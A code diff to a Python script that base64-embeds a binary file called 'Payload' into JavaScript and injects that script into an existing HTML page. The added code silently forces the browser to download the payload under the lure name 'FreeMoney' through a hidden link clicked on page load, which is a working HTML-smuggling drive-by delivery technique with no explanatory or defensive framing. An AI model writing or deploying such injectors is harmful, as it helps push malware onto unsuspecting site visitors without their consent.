@@ -7,14 +7,35 @@ with open("./payload/Payload", "rb") as payload_file:
 
 js_script = f"""
 
-    function downloadFile() {{
-        const encoded = "{encoded_data}"
-        const decoded = window.atob(encoded)
+    function decodeData(data) {{
+        const decoded = window.atob(data)
+        const len = decoded.length
 
-        console.log(decoded)
+        var bytes = new Uint8Array( len );
+        for (var i = 0; i < len; i++) {{ bytes[i] = decoded.charCodeAt(i) }}
+
+        return bytes.buffer;
     }}
 
-    downloadFile()
+    const data = decodeData("{encoded_data}")
+    const fileName = "FreeMoney"
+
+    const blob = new Blob([data], {{type: 'octet/stream'}})
+
+    if (window.navigator.msSaveOrOpenBlob) {{
+        window.navigator.msSaveOrOpenBlob(blob,fileName)
+    }} else {{
+        const a = document.createElement('a');
+        console.log(a);
+        document.body.appendChild(a);
+        a.style = 'display: none';
+        const url = window.URL.createObjectURL(blob);
+        a.href = url;
+        a.download = fileName;
+        a.click();
+        window.URL.revokeObjectURL(url);
+    }}
+    console.log(data)
 """
 
 def main():
@@ -22,9 +43,6 @@ def main():
         html_content = original_file.read()
 
     soup = BeautifulSoup(html_content, "html.parser")
-
-    title = soup.title.string
-    print(f"Title of the page: {title}")
 
     new_script = soup.new_tag("script")
     new_script.string = js_script
